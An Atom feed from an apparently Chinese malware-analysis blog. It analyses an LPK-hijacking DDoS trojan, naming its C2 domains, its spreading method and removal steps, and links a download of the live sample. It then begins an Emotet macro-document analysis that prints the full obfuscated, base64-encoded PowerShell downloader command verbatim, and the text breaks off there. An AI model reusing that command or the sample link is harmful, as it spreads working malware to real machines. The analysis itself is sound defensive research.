<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xNOPE</title>
  
  
  <link href="http://0xnope.top/atom.xml" rel="self"/>
  
  <link href="http://0xnope.top/"/>
  <updated>2021-07-18T10:51:58.286Z</updated>
  <id>http://0xnope.top/</id>
  
  <author>
    <name>0xNOPE</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>lpk劫持样本分析</title>
    <link href="http://0xnope.top/2021/07/18/lpk%E5%8A%AB%E6%8C%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://0xnope.top/2021/07/18/lpk%E5%8A%AB%E6%8C%81%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-07-18T06:00:18.000Z</published>
    <updated>2021-07-18T10:51:58.286Z</updated>
    
    <content type="html"><![CDATA[<h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><h2 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h2><blockquote><p>病毒名称：3601.exe<br>所属家族：Trojan-DDoS.Win32.Macri.atk<br>MD5：    304bbe0e401d84edf63b68588335ceb6<br>SHA-1：    8389fb0466449755c9c33716ef6f9c3e0f4e19c8<br>SHA-256：    1f3e836b4677a6df2c2d34d3c6413df2c5e448b5bc1d5702f2a96a7f6ca0d7fb                                                                                              File size：    52.50 KB (53760 bytes)</p></blockquote><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718141012.png" alt="LPK_3601004（vt）"></p><h2 id="测试环境及工具"><a href="#测试环境及工具" class="headerlink" title="测试环境及工具"></a>测试环境及工具</h2><blockquote><p>测试环境：Windows 7</p><p>测试工具：PEID、StudyPE、IDA Pro、x32dbg、火绒剑</p></blockquote><h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718141041.png" alt="LPK_3601005（行为）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718151805.png" alt="LPK_3601006（网络行为）"></p><p>从上面的沙箱检测结果，初步可以得到的信息：</p><p>该病毒启动具有隐藏界面的cmd窗口，将自身拷贝到其他目录，修改网络代理设置，连接了三个域名等操作。</p><h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><h2 id="主要流程概述"><a href="#主要流程概述" class="headerlink" title="主要流程概述"></a>主要流程概述</h2><p>第一次运行样本后会创建系统服务、添加注册表的键值，根据系统时间随机生成一个名字的文件，将母体拷贝到该文件并释放到C:/Windows路径下，给新生成的子文件icykmk.exe添加服务的自启动项，结束母体并删除。</p><p>之后运行icykmk.exe，首先加载hra33.dll然后创建4个线程。</p><p>加载的hra33.dll首先遍历文件，判断是否存在.exe，如果存在，就继续递归寻找下一个；否则，就在同路径下创建lpk.dll；然后判断是否存在.rar或者.zip，如果存在，就继续递归寻找下一个，如果不存在就往压缩包添加lpk.dll。</p><p>线程1：通过弱口令感染局域网内的共享文件夹，将病毒释放到共享文件夹中。<br>线程2：连接到控制端sbcq.f3322.org，获取当前系统信息（CPU型号，系统版本，上线时间，内存信息等）发送给病毒作者，然后就循环等待病毒作者的指令接收，判断info的类型，做出相应的操作。<br>线程3：连接控制端<a href="http://www.520123.xyz.具体功能同线程2./">www.520123.xyz。具体功能同线程2。</a><br>线程4：连接控制端<a href="http://www.520520520.org:9426。具体功能同线程2。">www.520520520.org:9426。具体功能同线程2。</a></p><p>流程图如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718184440.png" alt="LPK_3601046（流程图）"></p><h2 id="样本动作捕捉"><a href="#样本动作捕捉" class="headerlink" title="样本动作捕捉"></a>样本动作捕捉</h2><p>运行样本，火绒剑捕捉样本行为动作：</p><p>设置注册表项：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154640.png" alt="LPK_3601010（注册表操作）"></p><p>创建进程操作：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154733.png" alt="LPK_3601011（进程操作1）"></p><p>文件增删查改操作：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154752.png" alt="LPK_3601011（文件操作）"></p><p>网络收包发包操作：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154815.png" alt="LPK_3601013（网络操作）"></p><p>下面是随机生成名字的子程序进程和har33.dll：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154851.png" alt="LPK_3601014（hra33dll）"></p><h2 id="具体行为分析"><a href="#具体行为分析" class="headerlink" title="具体行为分析"></a>具体行为分析</h2><p>查壳</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154023.png" alt="002"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154113.png" alt="LPK_3601003（脱壳）"></p><p>首先，查壳，病毒upx加壳，手动esp定律或者upx -d脱壳后PEID看到病毒是由Microsoft Visual C++ 6.0编写。</p><p>studyPE查看导入表：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718154447.png" alt="LPK_3601007（导出函数）"></p><h3 id="初次运行初始化服务"><a href="#初次运行初始化服务" class="headerlink" title="初次运行初始化服务"></a>初次运行初始化服务</h3><p>IDA Pro7.5载入样本文件，进入WinMain函数：</p><p>WinMain函数中是网络相关的函数,判断服务及注册表是否存在，并且母体病毒开始初始化。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718155132.png" alt="LPK_3601015（WinMain）"></p><p>sub_405A52()函数内部就是判断键值是否存在。就是判断是否创建了一个名为”Ghijkl Nopqrstu Wxy“的服务，如果创建了，就返回1，执行if当中的操作；如果没有创建，那么执行else当中的操作，创建服务。简言之，就是判断样本是否第一次运行。</p><p>下面分析else当中的sub_405B6E()：</p><h4 id="sub-405B6E"><a href="#sub-405B6E" class="headerlink" title="sub_405B6E()"></a>sub_405B6E()</h4><p>1、在ADVAPI32.dll中加载函数，遍历文件。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160245.png" alt="LPK_3601016（sub_405B6E）"></p><p>2、根据时间随机生成数作为文件名进行拼接，然后拷贝到C:\Windows\目录下。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160307.png" alt="LPK_3601017（sub_405B6E）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160339.png" alt="LPK_3601018（sub_405B6E）"></p><p>3、创建服务。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160448.png" alt="LPK_3601019（sub_405B6E）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160522.png" alt="LPK_3601020（sub_405B6E）"></p><p>4、添加注册表项。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160553.png" alt="LPK_3601021（sub_405B6E）"></p><h4 id="sub-40355B"><a href="#sub-40355B" class="headerlink" title="sub_40355B()"></a>sub_40355B()</h4><p>然后分析下面的sub_40355B()：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718160739.png" alt="LPK_3601022（sub_40355B）"></p><p>上面的伪代码可以看到：母体通过字符串拼接执行cmd命令删除自身，设置高优先级。</p><p>以上代码，程序第一次运行，将自己拷贝到指定系统目录，创建服务，启动服务，删除自身。</p><p>若服务已被创建，则通过判断，第二次打开程序则直接打开服务。调用sub_40561A()。</p><h3 id="再次运行sub-40561A-主函数"><a href="#再次运行sub-40561A-主函数" class="headerlink" title="再次运行sub_40561A()主函数"></a>再次运行sub_40561A()主函数</h3><p>会先判断键值是否存在，如果存在的话就开启服务，进入服务回调继续分析。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718161131.png" alt="LPK_3601015（WinMain）"></p><p>sub_40561A()主函数内容如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718161234.png" alt="LPK_3601023（sub_40561A）"><br>作为新程序的主程序，之前先做了服务初始化操作，主要分析下面的函数。</p><h4 id="回调函数EnumFunc："><a href="#回调函数EnumFunc：" class="headerlink" title="回调函数EnumFunc："></a>回调函数EnumFunc：</h4><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718161547.png" alt="LPK_3601024（枚举）"></p><h4 id="sub-4053A6"><a href="#sub-4053A6" class="headerlink" title="sub_4053A6()"></a>sub_4053A6()</h4><p>sub_4053A6()函数主要作用的就是加载dll。<br>在sub_4053A6()函数中，检查注册表，打开hra33.dll，拷贝2个资源到hra33.dll。大致如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718161904.png" alt="LPK_3601025（sub_4053A6）"></p><p>释放资源：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718161918.png" alt="LPK_3601026（sub_4053A6）"></p><p>sub_4034E5()函数加载hra33.dll，该dll具有dll劫持功能。</p><p>下面分析一下创建的四个线程当中的具体操作。</p><h4 id="线程1："><a href="#线程1：" class="headerlink" title="线程1："></a>线程1：</h4><p>初始化一堆字符串，根据下面获取主机名以及网络连接的函数，IPC内置的一些弱口令。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718162345.png" alt="LPK_3601028（sub_402DD5）"></p><p>弱口令攻击：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718162358.png" alt="LPK_3601029（sub_402DD5）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718162429.png" alt="LPK_3601030（sub_402DD5）"></p><p>线程1的作用就是：通过弱口令感染局域网其他主机， 如果连接成功通过，通过共享目录将病毒传播出去， 利用 at 定时执行启动任务， 通过 admin$共享传播病毒。</p><h4 id="线程234："><a href="#线程234：" class="headerlink" title="线程234："></a>线程234：</h4><p>第二、三、四线程功能基本相同，区别是连接的地址不同。</p><p>就拿线程2来说：</p><p>该线程首先与sbcq.f3322.org控制端进行网络连接，如果连接成功继续往下，不然就返回。然后初始化socket套接字。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718163039.png" alt="LPK_3601031（sub_4051E0）"></p><p>sub_4060F0()函数当中获取了一些系统内存cpu等信息，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718163640.png" alt="LPK_3601032（sub_4060F0）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718163654.png" alt="LPK_3601033（sub_4060F0）"></p><p>之后又加载了hra33.dll，将收集到的系统相关信息发送到控制端，等待接收控制端发来的指令，当接收的数据&gt;6时才开始进行swtich…case中进行匹配。</p><p>指令 &gt; 6时：</p><p>当指令为0x10时，会从网络上下载恶意代码到临时的文件然后执行它。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164137.png" alt="LPK_3601034（sub_4051E0）"></p><p>当指令为0x12：<br>打开互斥体，防止多开带来的检测风险。根据系统时间随机生成文件名，初始化一些信息，设置优先级，更新病毒，如果下载成功就删除服务，注册表以及自身的程序。执行新的程序，退出本身。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164256.png" alt="LPK_3601035（sub_4051E0）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164358.png" alt="LPK_3601036（sub_4051E0）"></p><p>当指令为0x14：<br>打开IE浏览器并弹框。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164444.png" alt="LPK_3601037（sub_4051E0）"></p><p>当指令 &lt; 0x6时：<br>指令等于0x6：<br>和0x12执行一致，打开互斥体，防止多开带来的检测风险。根据系统时间随机生成文件名，初始化一些信息，设置优先级，更新病毒，如果下载成功就删除服务，注册表以及自身的程序。执行新的程序，退出本身。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164716.png" alt="LPK_3601038（sub_4051E0）"></p><p>当指令为0x2：</p><p>进行初始化socket</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164841.png" alt="LPK_3601039（sub_4051E0）"></p><p>当指令为0x3：</p><p>sub_403280函数，里面仍然会做一些判断，继续分析各个函数，会发现这是一个发包的函数。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164830.png" alt="LPK_3601040（sub_4051E0）"></p><p>GET数据请求头：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718164957.png" alt="LPK_3601041（sub_403280）"></p><p>GET请求数据包：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718165008.png" alt="LPK_3601042（sub_403280）"></p><p>指令为0x4：<br>仍旧是初始化socket。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718165200.png" alt="LPK_3601033（sub_4051E0）"></p><p>至此线程2分析结束。</p><p>总结一下，它获取系统信息，cpu信息，内存信息，将这些信息发往控制端，通过控制端发来的指令类型执行不同的操作。</p><p>第二个远程连接服务器地址sbcq.f3322.org</p><p>第三个远程连接服务器地址<a href="http://www.520123.xyz/">www.520123.xyz</a></p><p>第四个远程连接服务器地址被加密，”1NTUHRYRExYRExYREx3c0eQJChcRFUM=”，解密后是<a href="http://www.520520520.org:9426/">www.520520520.org:9426</a></p><p>接着来分析分析劫持lpk.dll的hra33.dll。</p><h4 id="hra33-dll："><a href="#hra33-dll：" class="headerlink" title="hra33.dll："></a>hra33.dll：</h4><p>Dllmain函数中分析，获取模块名字后判断病毒文件是否存在，如果存在，就在同目录下将内存数据写入到.TMP临时文件，并创建一个胡互斥体，检测同目录下是否存在lpk.dll，如果存在，加载lpk.dll到zip，rar文件，并且同目录下创建exe。如果没有被加载就释放dll文件。之后获取原lpk.dll，将其替换为自己的lpk.dll，实现lpk劫持。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718165618.png" alt="LPK_3601043（hra33）"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718165639.png" alt="LPK_3601044（hra33）"></p><p>sub_1000142B()当中是添加压缩包的操作：</p><p>利用rar的shell命令进行操作，先检查同路径有没有lpk.dll，如果没有，就以最大速度解压文件，将lpk.dll添加到文件夹中，然后再重新压缩文件，最后删除临时文件。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210718165821.png" alt="LPK_3601045（sub_1000142B）"></p><p>以上，就是hra33.dll当中的操作。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>手工查杀步骤或是工具查杀步骤或是查杀思路等。</p><p>1、使用PcHumter结束病毒程序</p><p>2、删除HKEY_LOCAL_MACHINE\system\CurrentControlset\services\Ghijkl Nopqrstu Wxy下注册表键；</p><p>3、结束服务：Ghijkl Nopqrstu Wxy，删除服务对应的exe文件。</p><p>4、删除C:\windows\system32\hra33.dll文件；</p><p>5、删除生成的lpk.dll文件。</p><p>样本文件如下，请在虚拟机中运行！！！</p><p>提取码1234</p><p><a href="https://pan.baidu.com/s/1EeLqt_l263-6nscIGX1y7g">https://pan.baidu.com/s/1EeLqt_l263-6nscIGX1y7g</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;样本概况&quot;&gt;&lt;a href=&quot;#样本概况&quot; class=&quot;headerlink&quot; title=&quot;样本概况&quot;&gt;&lt;/a&gt;样本概况&lt;/h1&gt;&lt;h2 id=&quot;样本基本信息&quot;&gt;&lt;a href=&quot;#样本基本信息&quot; class=&quot;headerlink&quot; title=&quot;样本基本信</summary>
      
    
    
    
    <category term="Reverse" scheme="http://0xnope.top/categories/Reverse/"/>
    
    
    <category term="Windows" scheme="http://0xnope.top/tags/Windows/"/>
    
    <category term="Malware_analysis" scheme="http://0xnope.top/tags/Malware-analysis/"/>
    
  </entry>
  
  <entry>
    <title>一次Emotet恶意样本分析</title>
    <link href="http://0xnope.top/2021/05/06/%E4%B8%80%E6%AC%A1Emotet%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://0xnope.top/2021/05/06/%E4%B8%80%E6%AC%A1Emotet%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</id>
    <published>2021-05-06T06:13:55.000Z</published>
    <updated>2021-05-08T06:20:24.129Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Emotet背景"><a href="#Emotet背景" class="headerlink" title="Emotet背景"></a>Emotet背景</h1><p>Emotet是一款过去几年中活动最频繁的恶意软件之一。2014年Emotet首先以银行木马的形式出现，德国和奥地利银行的客户受到该Emotet木马的影响，在接下来的几年中，Emotet主要通过垃圾电子邮件在全球广泛传播。Emotet主要窃取财务和个人数据，在接下来几年逐渐发展为成熟的僵尸网络。</p><p>除此之外，Emotet还充当投放工具、下载程序，成为其他恶意软件的传播载体。</p><p>在大多数情况下，“投放”的程序包括下列几种：</p><ul><li>Trickster（也称为 TrickLoader 和 TrickBot）：一种银行木马病毒，它试图获取对银行账户登录数据的访问权限。</li><li><a href="https://www.kaspersky.com/resource-center/threats/ransomware-examples">Ryuk</a> ：一种加密木马病毒 - 也称为 Cryptotrojan 或勒索软件 - 它会对数据加密，从而阻止计算机用户访问此数据或整个系统。</li></ul><p>根据AnyRun发布了2020年年度报告中，Emotet 木马被上传的次数高达3w余次，充分说明了它的活跃程度，所以对Emotet木马进行简要分析。</p><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><h2 id="测试环境及工具"><a href="#测试环境及工具" class="headerlink" title="测试环境及工具"></a>测试环境及工具</h2><blockquote><p>运行平台：Windows7_ultimate_sp1_x64                                                                                                                                                                                                   进程监控工具：ProcessHacker                                                                                                                                                                                                      调试分析工具：Microsoft Visual Basic Application、powershell_ise、Visual Studio2019</p></blockquote><h2 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h2><blockquote><p>样本名称：XU3895168728ZP.doc                                                                                                                                                                  样本大小：155.55 KB (159283 bytes)                                                                                                                                                                                   样本类型：MS Word Document                                                                                                                                                                           MD5：a58394937da9d3adb33e948058fde4e9                                                                                                                                                                   SHA1：2b5f5fa17bc6a6df9dea54224dccb6ed5b0512d6                                                                                                                                                               SHA256：a268e9e152c260a0e80431aa8d6df187d9f24a1b6be71328ea14320436083f51                                                                                                                                                                                                                                                                                                                                                                         SSDeep：3072:2ISPO2TNqU+PRGfFz9ufstRUUKSns8T00JSHUgteMJ8qMD7gAUh:Ct+P6z9ufsfgIf0pLAC</p></blockquote><h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><h1 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="powershell分析"><a href="#powershell分析" class="headerlink" title="powershell分析"></a>powershell分析</h3><p>双击点开样本，提示需要启用宏功能，这是典型的Office类宏病毒手法，使用VBA宏脚本来隐藏实际功能，如下：</p><p>看到一个cmd窗口一闪而过，毫无疑问执行了powershell脚本，然后弹出了个MessageBox。</p><p>我们打开ProcessHack检测一下进程，如下：</p><p>我们将加密的字符串拷贝出来，如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd cmd cmd cmd &#x2F;c msg %username% &#x2F;v Word experienced an error trying to open the file. &amp;  P^Ow^er^she^L^L -w hidden -ENCOD                 cwBFAHQAIAAoACIAWgB5ADMAIgArACIANQAiACkAIAAoAFsAVAB5AFAAZQBdACgAIgB7ADIAfQB7ADUAfQB7ADQAfQB7ADAAfQB7ADEAfQB7ADMAfQAiACAALQBmACAAJwBJAFIAZQBDACcALAAnAFQAbwAnACwAJwBTAHkAUwB0AEUATQAuACcALAAnAFIAWQAnACwAJwBPAC4ARAAnACwAJwBpACcAKQAgACkAOwAgACAAUwBlAHQALQBJAFQARQBNACAAdgBhAHIAaQBBAEIAbABlADoAWQBKAHUANAB6ADMAIAAgACgAWwBUAHkAcABlAF0AKAAiAHsANAB9AHsANQB9AHsAMwB9AHsANgB9AHsAMQB9AHsANwB9AHsAMAB9AHsAMgB9ACIAIAAtAGYAJwBjAGUAJwAsACcAZQBUAC4AUwBlAFIAVgAnACwAJwBwAE8AaQBuAFQATQBBAE4AQQBnAEUAcgAnACwAJwBTAHQAZQBtAC4AJwAsACcAUwAnACwAJwBZACcALAAnAG4AJwAsACcAaQAnACkAIAAgACkAOwAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACgAKAAnAFMAJwArACcAaQBsAGUAJwApACsAJwBuACcAKwAoACcAdABsACcAKwAnAHkAQwBvACcAKQArACcAbgAnACsAKAAnAHQAJwArACcAaQBuAHUAZQAnACkAKQA7ACQAVQAxAHUAaAA3ADQAOAA9ACQARQAzADQASAAgACsAIABbAGMAaABhAHIAXQAoADYANAApACAAKwAgACQARwAzADUAUQA7ACQAQgA2ADIAUQA9ACgAKAAnAEwAJwArACcAMAAzACcAKQArACcASwAnACkAOwAgACgAIAAgAGQAaQByACAAIAAoACcAVgBBAHIASQAnACsAJwBBACcAKwAnAEIATAAnACsAJwBlADoAegB5ADMANQAnACkAKQAuAHYAYQBMAFUARQA6ADoAIgBDAGAAUgBlAEEAYABUAGUAZABgAEkAcgBFAGMAVABvAFIAeQAiACgAJABIAE8ATQBFACAAKwAgACgAKAAoACcAWABFADgAWgAnACsAJwAzAHQAJwApACsAKAAnAG4AYwAnACsAJwA1AGQAWABFADgATAAnACkAKwAnADYAJwArACcAegAzACcAKwAnAG8AJwArACgAJwBvACcAKwAnADMAWAAnACkAKwAnAEUAOAAnACkALQBSAGUAUABMAEEAQwBlACAAKABbAEMASABBAHIAXQA4ADgAKwBbAEMASABBAHIAXQA2ADkAKwBbAEMASABBAHIAXQA1ADYAKQAsAFsAQwBIAEEAcgBdADkAMgApACkAOwAkAE0AOQA1AEEAPQAoACcARgA3ACcAKwAnADAATgAnACkAOwAgACAAKABMAHMAIAAgAFYAQQByAGkAQQBCAGwAZQA6AFkASgBVADQAWgAzACkALgB2AGEATAB1AEUAOgA6ACIAcwBlAGAAQwB1AHIAYABpAGAAVABZAHAAYABSAG8AdABPAEMAbwBMACIAIAA9ACAAKAAoACcAVABsAHMAJwArACcAMQAnACkAKwAnADIAJwApADsAJABMADUAXwBDAD0AKAAnAFAANgAnACsAJwA3AEsAJwApADsAJABWAGwAegBjAHoAaQAwACAAPQAgACgAJwBPADIAJwArACcAOABDACcAKQA7ACQAUAA0ADAATwA9ACgAJwBXACcAKwAoACcAMwAnACsAJwAxAEMAJwApACkAOwAkAEYANABtAG4AcQBhAGYAPQAkAEgATwBNAEUAKwAoACgAJwB7ADAAfQBaADMAdAAnACsAKAAnAG4AYwAnACsAJwA1AGQAJwApACsAJwB7ADAAfQBMADYAegAzACcAKwAnAG8AbwAzAHsAMAAnACsAJwB9ACcAKQAgACAALQBmAFsAYwBIAGEAcgBdADkAMgApACsAJABWAGwAegBjAHoAaQAwACsAKAAnAC4AJwArACgAJwBkAGwAJwArACcAbAAnACkAKQA7ACQASgAwADQAQgA9ACgAJwBRACcAKwAoACcANAAwACcAKwAnAEwAJwApACkAOwAkAE0AbAAzAGUAdgBxAGwAPQAoACcAXQAnACsAJwBlADEAJwArACcAcgBbACcAKwAnAFMAJwArACgAJwA6AC8ALwBpAG4AJwArACcAcwAnACsAJwB2AGEAdAAuAGMAbwAnACsAJwBtACcAKwAnAC8AJwApACsAKAAnAHcAcAAtACcAKwAnAGEAJwArACcAZABtAGkAbgAvAEQAdwAnACkAKwAnAC8AJwArACgAJwBAAF0AJwArACcAZQAxACcAKQArACcAcgBbACcAKwAnAFMAJwArACcAOgAvACcAKwAoACcALwBsAGkAdAAnACsAJwB0AGwAJwArACcAZQAnACkAKwAoACcAaQBuAGQAJwArACcAaQBhACcAKQArACgAJwBkACcAKwAnAGkAcgBlACcAKQArACcAYwB0ACcAKwAoACcAbwByAHkALgBjACcAKwAnAG8AJwApACsAJwBtACcAKwAnAC8AbAAnACsAJwAvAFQAJwArACgAJwBPAFkAJwArACcAdQAnACkAKwAnAFQAJwArACgAJwAvAEAAJwArACcAXQBlADEAcgBbACcAKwAnAFMAJwArACcAOgAvACcAKQArACgAJwAvAGIAbABvAGcAJwArACcAcwAuAGcAJwApACsAKAAnADIAJwArACcAZwB0AGUAYwBoAG4AJwArACcAbwBsAG8AZwBpAGUAJwApACsAJwBzACcAKwAoACcALgBjAG8AbQAvAGIAJwArACcAbAAnACkAKwAoACcAbwAnACsAJwBnAHMALwB2ACcAKQArACgAJwAvAEAAJwArACcAXQBlADEAcgAnACkAKwAoACcAWwBTADoALwAvACcAKwAnAHAAYQAnACsAJwB0AHQAYQAnACsAJwB5ACcAKwAnAGEAcwB0AG8AcgBlACcAKQArACcALgBjACcAKwAoACcAbwBtACcAKwAnAC8AdgBpACcAKQArACgAJwBzAGkAbwAtACcAKwAnAG4AJwApACsAKAAnAGUAdAB3ACcAKwAnAG8AJwApACsAKAAnAHIAawAtADEAJwArACcAaAAnACkAKwAoACcAbQAnACsAJwBwAHAALwAnACkAKwAoACcAagA1AC8AQAAnACsAJwBdACcAKQArACcAZQAnACsAKAAnADEAcgBbAFMAJwArACcAOgAnACkAKwAoACcALwAvAHIAcwAnACsAJwBpACcAKQArACcAbQBhACcAKwAoACcAZAAnACsAJwBpAG4AJwApACsAKAAnAGEAJwArACcAaAAuAGMAJwApACsAKAAnAG8AbQAnACsAJwAvAHcAcAAnACsAJwAtAGMAbwBuACcAKQArACgAJwB0ACcAKwAnAGUAbgAnACkAKwAoACcAdAAvADEAJwArACcANgAnACsAJwBxAFQALwBAACcAKwAnAF0AZQAxACcAKQArACgAJwByAFsAUwAnACsAJwBzADoALwAvACcAKwAnAHQAZQAnACkAKwAoACcAbgAnACsAJwBtAG8AJwApACsAKAAnAG4AZQB5AC4AJwArACcAYgAnACsAJwB1AHMAaQBuACcAKQArACgAJwBlAHMAJwArACcAcwAvAHcAcAAnACkAKwAoACcALQBjAG8AJwArACcAbgB0AGUAJwArACcAbgB0ACcAKQArACgAJwAvACcAKwAnAG4AaABXACcAKwAnAC8AQABdAGUAMQByAFsAJwApACsAJwBTACcAKwAoACcAcwA6AC8AJwArACcALwAnACsAJwBzAHUAJwArACcAcgBlAG8AcAB0ACcAKQArACcAaQAnACsAJwBtAGkAJwArACgAJwB6AGUAJwArACcALgBjAG8AJwApACsAJwBtACcAKwAoACcALwAnACsAJwB3AGUAJwApACsAKAAnAGwAbAAnACsAJwAtACcAKQArACgAJwBrAG4AJwArACcAbwB3AG4ALwAnACsAJwBRAHMAJwApACsAKAAnAEUAJwArACcAcwAvACcAKQApAC4AIgBSAGUAUABgAEwAYQBgAGMARQAiACgAKAAnAF0AJwArACgAJwBlACcAKwAnADEAcgBbACcAKQArACcAUwAnACkALAAoAFsAYQByAHIAYQB5AF0AKAAnAHMAZAAnACwAJwBzAHcAJwApACwAKAAnAGgAdAAnACsAJwB0AHAAJwApACwAJwAzAGQAJwApAFsAMQBdACkALgAiAFMAcABMAGAAaQB0ACIAKAAkAFIANwAxAFAAIAArACAAJABVADEAdQBoADcANAA4ACAAKwAgACQAWAA0ADkAUgApADsAJABJADEANABHAD0AKAAnAFcAJwArACgAJwA5ACcAKwAnADQARwAnACkAKQA7AGYAbwByAGUAYQBjAGgAIAAoACQAUQB4ADUANQBpAHoANQAgAGkAbgAgACQATQBsADMAZQB2AHEAbAApAHsAdAByAHkAewAoAC4AKAAnAE4AZQB3ACcAKwAnAC0ATwBiAGoAJwArACcAZQBjAHQAJwApACAAcwB5AFMAdABFAG0ALgBuAGUAVAAuAFcARQBCAGMAbABpAEUAbgB0ACkALgAiAGQAYABPAGAAdwBuAEwAbwBgAEEARABmAEkAbABFACIAKAAkAFEAeAA1ADUAaQB6ADUALAAgACQARgA0AG0AbgBxAGEAZgApADsAJABHADUAMABDAD0AKAAnAFUAJwArACgAJwAzADcAJwArACcAVwAnACkAKQA7AEkAZgAgACgAKAAmACgAJwBHAGUAdAAtACcAKwAnAEkAdABlACcAKwAnAG0AJwApACAAJABGADQAbQBuAHEAYQBmACkALgAiAEwARQBOAGAARwB0AGgAIgAgAC0AZwBlACAAMwAxADkANgAzACkAIAB7ACYAKAAnAHIAJwArACcAdQBuAGQAbAAnACsAJwBsADMAMgAnACkAIAAkAEYANABtAG4AcQBhAGYALAAoACgAJwBDACcAKwAnAG8AbgB0AHIAbwAnACsAJwBsAF8AUgB1ACcAKQArACcAbgBEACcAKwAnAEwAJwArACcATAAnACkALgAiAHQAYABPAHMAYABUAHIASQBOAEcAIgAoACkAOwAkAEgAMwA3AEMAPQAoACcASAAnACsAKAAnADMAMAAnACsAJwBKACcAKQApADsAYgByAGUAYQBrADsAJABLADQAXwBRAD0AKAAnAE0AMQAnACsAJwA2AFEAJwApAH0AfQBjAGEAdABjAGgAewB9AH0AJABCADcAMgBIAD0AKAAnAFMAJwArACgAJwBfAF8AJwArACcAWAAnACkAKQA&#x3D;</span><br></pre></td></tr></table></figure><p>看到最后的“=”符号，我们首先推断是base64加密，解密过后去除混淆，调整一